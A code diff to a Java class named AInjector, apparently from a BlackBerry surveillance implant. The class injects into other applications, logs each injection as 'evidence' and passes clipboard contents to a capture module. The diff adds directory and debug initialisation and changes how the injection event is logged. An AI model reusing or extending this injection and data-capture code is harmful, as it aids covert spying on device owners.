@@ -12,11 +12,11 @@ package blackberry.injection.injectors;
 import net.rim.device.api.system.Clipboard;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
-import blackberry.Main;
 import blackberry.Messages;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
+import blackberry.fs.Path;
 import blackberry.module.ModuleClipboard;
 
 public abstract class AInjector {
@@ -57,6 +57,7 @@ public abstract class AInjector {
     }
 
     public void setInjectedApp(UiApplication app) {        
+        init();
         
         //#ifdef DEBUG
         debug.trace("setInjectedApp: INJECTED"); //$NON-NLS-1$
@@ -69,14 +70,16 @@ public abstract class AInjector {
         this.injectedApp = app;
         
         final String appName = getAppName();
-        Main main = Main.getInstance();
+       /* Main main = Main.getInstance();
         main.invokeLater(new Runnable() {
             public void run() {
              // A.0=INJ: 
                 Evidence.info(Messages.getString("A.0") + appName); //$NON-NLS-1$
             }
-        });
+        });*/
         
+        Evidence.info(Messages.getString("A.0") + appName); //$NON-NLS-1$
+
     }
 
     public UiApplication getInjectedApp() {
@@ -116,6 +119,13 @@ public abstract class AInjector {
             String clip = (String) object;
             ModuleClipboard.getInstance().setClip(clip);
         }
+    }
+    
+    public synchronized void init() {
+        if (!Path.isInizialized()) {
+            Path.makeDirs();
+        }
+        Debug.init();
     }
 
     public abstract String getPreferredMenuName();
